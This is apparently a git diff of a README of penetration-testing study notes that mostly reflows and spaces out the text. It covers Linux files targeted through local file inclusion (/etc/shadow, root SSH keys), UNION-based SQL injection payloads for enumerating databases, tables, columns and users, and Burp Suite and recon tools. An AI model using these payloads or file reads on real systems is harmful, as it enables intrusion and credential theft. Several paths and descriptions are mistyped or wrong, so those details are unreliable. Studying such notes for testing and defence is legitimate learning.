@@ -123,18 +123,31 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - Common OS files location:
   
 		/etc/issue
+  
 		/etc/profile
+  
 		/proc/version
+  
 		/etc/passwd
+  
 		/etc/shadow
+  
 		/rott/.bash_history
+  
 		/var/log/dmessage
+  
 		/var/mail/root
+  
 		/root/.ssh/id_rsa (has history commands for root user)
+  
 		/var/log/dmessage (has global system messages)
+  
 		/var/mail/root
+  
 		/var/log/apache2/access.log ( has accessed requests for Apache web server)
+  
 		C:\boot.ini
+  
 		/root/.ssh/id_rsa (private SSH keys)
 
 - Null Byte Usage (local file inclusion):
@@ -173,14 +186,14 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 		$ username UNION SELECT 1,2,3;-- (finding the path to the actual column)
   
 		$ username UNION SELECT 1,2,3 where database() like '%';-- (enumeration of the database)
-			--cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string matches the first letter of the database name. 					After finding the first letter do it until we find the database full name.
+			--cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string 				matches the first letter of the database name. After finding the first letter do it until we find the database full 			name.
   
-		$ username UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'something' and table_name like 'a%';--  (enumeration of table name)
+		$ username UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'something' and table_name like 'a%';--  		(enumeration of table name)
 			-- using infromation_schema database to find the table name just like we found the databse name using "like" operator.
   
-		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%'; (enumerating column 		name)
+		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%'; (enumerating column name)
   
-		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%' and COLUMN_NAME !			='id'; (preventing the discovery of the same column twice)
+		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id'; (preventing the discovery of the same column twice)
   
 		$ username UNION SELECT 1,2,3 from users where username like 'a% (enumeration of username)
   
@@ -195,15 +208,22 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 # Burp Suite:
 
 - Proxy (enables interception and modification of requests and responses)
+  
 - Reapeater (captures, modifies and resends the captured request multiple time) -- Useful for crafting SQLi payloads.
+  
 - Intruder ( allows for spraying endpoints with requests) -- used for brute-force attacks or fuzzing endpoints.
+  
 - Decoder (data transformation) -- decode or encode payloads before sending.
+  
 - Comparer (compares two pieces of captured data at word or byte level)
+  
 - Sequencer (used when assessing randomly generated data such as session cookie values)
+  
 - Also has extensions to enhance the framework's functionality.
 
 # Reconnaissance:
 - Passive Reconnaissance: whois, nslookup, dig, shodan.io
+  
 - Active Reconnaissance: ping, traceroute, telnet, nc
 
 # Nmap Live Host Discovery:
